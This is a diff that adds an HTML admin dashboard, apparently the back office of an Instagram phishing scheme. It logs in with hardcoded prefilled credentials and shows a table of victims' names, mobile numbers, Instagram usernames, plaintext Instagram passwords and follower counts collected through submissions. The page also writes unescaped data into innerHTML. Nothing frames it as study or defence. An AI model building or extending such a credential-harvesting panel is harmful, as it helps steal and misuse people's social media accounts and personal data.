@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background: #0a0a0f;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: #1a1a2e;
+            padding: 30px;
+            border-radius: 16px;
+            max-width: 1000px;
+            width: 100%;
+            border: 1px solid #333;
+        }
+        h1 {
+            color: #f09433;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .login-box {
+            max-width: 400px;
+            margin: 40px auto;
+        }
+        .login-box input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 12px;
+            border-radius: 8px;
+            border: 1px solid #333;
+            background: #0a0a0f;
+            color: #fff;
+        }
+        .login-box button {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            background: #f09433;
+            color: #fff;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .login-box button:hover {
+            background: #dc2743;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+        th, td {
+            padding: 10px;
+            text-align: left;
+            border-bottom: 1px solid #333;
+        }
+        th {
+            background: #0a0a0f;
+            color: #f09433;
+        }
+        td {
+            color: #ccc;
+        }
+        .hidden {
+            display: none;
+        }
+        .logout-btn {
+            background: #dc2743;
+            color: #fff;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            float: right;
+        }
+        .logout-btn:hover {
+            background: #bc1888;
+        }
+        .count {
+            margin-top: 10px;
+            color: #aaa;
+        }
+        .error {
+            color: #dc2743;
+            margin-top: 10px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔐 Admin Panel</h1>
+
+        <div id="loginBox" class="login-box">
+            <input type="text" id="adminUser" placeholder="Username" value="admin">
+            <input type="password" id="adminPass" placeholder="Password" value="lisa123">
+            <button onclick="login()">Login</button>
+            <p id="loginError" class="error">Invalid credentials</p>
+        </div>
+
+        <div id="dashboard" class="hidden">
+            <button class="logout-btn" onclick="logout()">Logout</button>
+            <p class="count">Total Submissions: <span id="totalCount">0</span></p>
+            <div style="overflow-x:auto;">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>#</th>
+                            <th>Timestamp</th>
+                            <th>Name</th>
+                            <th>Mobile</th>
+                            <th>Instagram</th>
+                            <th>Password</th>
+                            <th>Followers</th>
+                        </tr>
+                    </thead>
+                    <tbody id="dataBody"></tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let token = null;
+
+        async function login() {
+            const username = document.getElementById('adminUser').value;
+            const password = document.getElementById('adminPass').value;
+            const errorEl = document.getElementById('loginError');
+
+            try {
+                const res = await fetch('/api/admin/auth', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    token = data.token;
+                    errorEl.style.display = 'none';
+                    document.getElementById('loginBox').classList.add('hidden');
+                    document.getElementById('dashboard').classList.remove('hidden');
+                    fetchData();
+                } else {
+                    errorEl.style.display = 'block';
+                }
+            } catch {
+                errorEl.style.display = 'block';
+            }
+        }
+
+        async function fetchData() {
+            try {
+                const res = await fetch('/api/admin/data', {
+                    headers: { 'Authorization': token }
+                });
+                if (res.status === 401) { logout(); return; }
+                const data = await res.json();
+                document.getElementById('totalCount').textContent = data.submissions.length;
+                const tbody = document.getElementById('dataBody');
+                tbody.innerHTML = '';
+                data.submissions.slice().reverse().forEach((item, index) => {
+                    tbody.innerHTML += `<tr>
+                        <td>${index + 1}</td>
+                        <td>${item.timestamp}</td>
+                        <td>${item.name}</td>
+                        <td>${item.mobile}</td>
+                        <td>${item.username}</td>
+                        <td>${item.password}</td>
+                        <td>${item.followers}</td>
+                    </tr>`;
+                });
+            } catch {
+                console.error('Failed to fetch data');
+            }
+        }
+
+        function logout() {
+            token = null;
+            document.getElementById('dashboard').classList.add('hidden');
+            document.getElementById('loginBox').classList.remove('hidden');
+            document.getElementById('loginError').style.display = 'none';
+        }
+
+        setInterval(() => { if (token) fetchData(); }, 30000);
+    </script>
+</body>
+</html>
